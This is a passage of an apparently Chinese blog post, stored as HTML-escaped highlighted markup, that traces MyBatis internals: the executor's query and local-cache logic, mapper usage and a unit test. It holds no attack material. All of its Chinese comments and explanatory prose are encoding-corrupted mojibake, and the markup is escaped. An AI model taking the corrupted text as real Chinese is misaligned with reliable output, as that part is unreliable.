&lt;span class=&#34;n&#34;&gt;resultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQLException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//å¾—åˆ°ç»‘å®šsqlï¼Œå°±æ˜¯å°†å‚æ•°æ’å…¥æ˜ å°„è¯­å¥é‡Œï¼Œè·å¾—å®Œæ•´çš„SQL
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;BoundSql&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBoundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//åˆ›å»ºç¼“å­˜Key
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;CacheKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;createCacheKey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//æŸ¥è¯¢
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

 &lt;span class=&#34;c1&#34;&gt;// æ‰§è¡ŒæŸ¥è¯¢
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MappedStatement&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RowBounds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ResultHandler&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CacheKey&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BoundSql&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQLException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// ErrorContext æ˜¯æ¯ä¸ªçº¿ç¨‹å•ç‹¬ä½¿ç”¨çš„é”™è¯¯ä¸Šä¸‹æ–‡ï¼Œå®ƒæ˜¯ç”¨ThreadLocalåˆ¶ä½œçš„.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;ErrorContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;resource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getResource&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;activity&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;executing a query&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//å¦‚æœå·²ç»å…³é—­ï¼ŒæŠ¥é”™
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;closed&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ExecutorException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Executor was closed.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//å…ˆæ¸…å±€éƒ¨ç¼“å­˜ï¼Œå†æŸ¥è¯¢.ä½†ä»…æŸ¥è¯¢å †æ ˆä¸º0ï¼Œæ‰æ¸…ã€‚ä¸ºäº†å¤„ç†é€’å½’è°ƒç”¨
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queryStack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isFlushCacheRequired&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;clearLocalCache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//åŠ ä¸€,è¿™æ ·é€’å½’è°ƒç”¨åˆ°ä¸Šé¢çš„æ—¶å€™å°±ä¸ä¼šå†æ¸…å±€éƒ¨ç¼“å­˜äº†
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;queryStack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++;&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//å…ˆæ ¹æ®cachekeyä»localCacheå»æŸ¥
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resultHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;localCache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//è‹¥æŸ¥åˆ°localCacheç¼“å­˜ï¼Œå¤„ç†localOutputParameterCache
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;handleLocallyCachedOutputParameters&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//ä»æ•°æ®åº“æŸ¥
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;queryFromDatabase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rowBounds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resultHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;boundSql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//æ¸…ç©ºå †æ ˆ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;queryStack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queryStack&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;c1&#34;&gt;//å»¶è¿ŸåŠ è½½é˜Ÿåˆ—ä¸­æ‰€æœ‰å…ƒç´ 
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeferredLoad&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;deferredLoad&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;deferredLoads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;deferredLoad&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

      &lt;span class=&#34;c1&#34;&gt;// issue #601
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;//æ¸…ç©ºå»¶è¿ŸåŠ è½½é˜Ÿåˆ—
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;deferredLoads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;clear&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configuration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLocalCacheScope&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LocalCacheScope&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;STATEMENT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// issue #482
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    	&lt;span class=&#34;c1&#34;&gt;//å¦‚æœæ˜¯STATEMENTï¼Œæ¸…æœ¬åœ°ç¼“å­˜
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;clearLocalCache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šæ˜¯&lt;code&gt;SqlSession.selectOne&lt;/code&gt;çš„æµç¨‹ã€‚ç„¶è€Œå®é™…ä¸­æˆ‘ä»¬ç›´æ¥ä½¿ç”¨SqlSessionæ¥æ‰§è¡Œæ•°æ®åº“æ“ä½œçš„æƒ…å†µå¾ˆå°‘ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å¤šæ•°æƒ…å†µæˆ‘ä»¬ä¼šè¿™æ ·ä½¿ç”¨MyBatis:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSessionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;openSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;BlogMapper&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BlogMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;Blog&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;blog&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;selectBlog&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ–¹æ³•çš„è¯¦ç»†è¿‡ç¨‹æˆ‘ä»¬ä½¿ç”¨MyBatisçš„å•å…ƒæµ‹è¯•æ¥æ¢ç´¢ã€‚&lt;/p&gt;
&lt;p&gt;å•å…ƒæµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;  &lt;span class=&#34;nd&#34;&gt;@Test&lt;/span&gt;
  &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;shouldSelectBlogWithPostsUsingSubSelect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;SqlSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqlSessionFactory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;openSession&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;BoundBlogMapper&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BoundBlogMapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;Blog&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mapper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;selectBlogWithPostsUsingSubSelect&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertEquals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertNotNull&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAuthor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertEquals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAuthor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertEquals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;jim&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAuthor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getUsername&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertEquals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;********&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAuthor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPassword&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;assertEquals&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPosts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¿«è¿›åˆ°&lt;code&gt;session.getMapper&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//è¿”å›ä»£ç†ç±»
